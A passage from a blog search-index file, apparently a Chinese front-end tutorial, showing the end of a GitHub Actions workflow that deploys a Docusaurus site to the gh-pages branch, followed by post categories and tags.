<span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">JamesIves/github-pages-deploy-action@releases/v3</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">ACCESS_TOKEN:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.ACCESS_TOKEN</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">        <span class="hljs-attr">BRANCH:</span> <span class="hljs-string">gh-pages</span></span><span class="line">        <span class="hljs-attr">FOLDER:</span> <span class="hljs-string">build</span></span><span class="line">        <span class="hljs-attr">BUILD_SCRIPT:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">npm</span> <span class="hljs-string">run</span> <span class="hljs-string">build</span></span></code></pre></div></div><ol start="8"><li>再次提交就可以了</li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
